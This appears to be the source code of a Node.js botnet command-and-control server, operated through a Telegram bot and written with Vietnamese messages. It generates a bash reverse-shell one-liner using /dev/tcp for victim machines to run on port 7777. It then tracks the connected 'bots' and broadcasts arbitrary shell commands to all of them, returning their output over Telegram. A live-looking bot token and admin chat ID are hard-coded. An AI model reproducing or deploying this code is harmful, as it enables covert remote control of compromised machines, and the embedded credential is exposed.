const net=require('net'),TelegramBot=require('node-telegram-bot-api'),https=require('https');
const token='8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc',chatIdAdmin=7371969470;
const bot=new TelegramBot(token,{polling:true}),clients=new Map(),pendingResponses=new Map();
let botCounter=1;

function disconnect(s){if(!clients.has(s))return;let c=clients.get(s);clients.delete(s);pendingResponses.delete(s);bot.sendMessage(chatIdAdmin,`[-] Bot mất kết nối: Bot ${c.id} - ${c.ip}:${c.port}`);try{s.destroy()}catch{}}

function resetIds(){let id=1;for(let c of clients.values())c.id=id++;botCounter=id;}

function sendSlaveCmd(){https.get('https://api.ipify.org?format=json',res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{let ip;try{ip=JSON.parse(d).ip}catch{ip='YOUR_PUBLIC_IP'};let cmd=`while true;do exec 3<>/dev/tcp/${ip}/7777;while read -r c <&3;do [[ -z "$c" ]]&&continue;o=$(bash -c "$c" 2>&1);echo "$o">&3;done;sleep 2;done`;bot.sendMessage(chatIdAdmin,`🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave:\n\`\`\`bash\n${cmd}\n\`\`\``,{parse_mode:'Markdown'});});}).on('error',()=>sendSlaveCmd());}

const server=net.createServer(s=>{
s.setKeepAlive(true,100);let ip=s.remoteAddress.replace(/^.*:/,''),port=s.remotePort;clients.set(s,{id:botCounter++,ip,port,lastResponse:Date.now(),uptime:'chưa cập nhật'});bot.sendMessage(chatIdAdmin,`[+] Bot kết nối: Bot ${botCounter-1} - ${ip}:${port}`);
let buf='';s.on('data',d=>{
buf+=d.toString();let lines=buf.split('\n');buf=lines.pop();lines.forEach(l=>{
if(!l.trim())return;if(!clients.has(s))return;let c=clients.get(s);c.lastResponse=Date.now();
if(l.startsWith('up'))c.uptime=l.trim();else{if(!pendingResponses.has(s))return;pendingResponses.get(s).data+=l.trim()+'\n';if(pendingResponses.get(s).completed)sendBotResponse(s);}
});});s.on('error',()=>disconnect(s));s.on('close',()=>disconnect(s));});

function sendBotResponse(s){if(!clients.has(s))return;let c=clients.get(s),response=pendingResponses.get(s);if(!response||!response.data)return;bot.sendMessage(chatIdAdmin,`🖥 Bot ${c.id} [${c.ip}]:\n\`\`\`\n${response.data}\`\`\``,{parse_mode:'Markdown'});pendingResponses.delete(s);}

server.listen(7777,()=>{console.log('[*] Server listening on port 7777');sendSlaveCmd();});

setInterval(()=>{let now=Date.now();for(let [s,c] of clients.entries()){if(now-c.lastResponse>1000)disconnect(s);else try{s.write('uptime -p\n')}catch{disconnect(s)}}resetIds();},200);

bot.onText(/^\/listbot$/,msg=>{if(msg.chat.id!==chatIdAdmin)return;if(clients.size===0)return bot.sendMessage(chatIdAdmin,'❌ Không có bot nào kết nối.');let text=`🤖 Có ${clients.size} bot đang kết nối:\n`;for(let c of clients.values())text+=`Bot ${c.id} - [${c.ip}:${c.port}] - Uptime: ${c.uptime}\n`;bot.sendMessage(chatIdAdmin,text);});

bot.onText(/^\/cmd (.+)/,(msg,m)=>{if(msg.chat.id!==chatIdAdmin)return;let cmd=m[1].trim();if(!cmd)return bot.sendMessage(chatIdAdmin,'❌ Vui lòng nhập lệnh: `/cmd <lệnh>`',{parse_mode:'Markdown'});if(clients.size===0)return bot.sendMessage(chatIdAdmin,'❌ Không có bot nào kết nối.');for(let s of clients.keys()){pendingResponses.set(s,{data:'',completed:false});try{s.write(cmd+'\n')}catch{}}bot.sendMessage(chatIdAdmin,`✅ Đã gửi lệnh đến ${clients.size} bot:\n\`${cmd}\``,{parse_mode:'Markdown'});setTimeout(()=>{for(let s of clients.keys()){if(pendingResponses.has(s)){pendingResponses.get(s).completed=true;sendBotResponse(s);}}},100);});
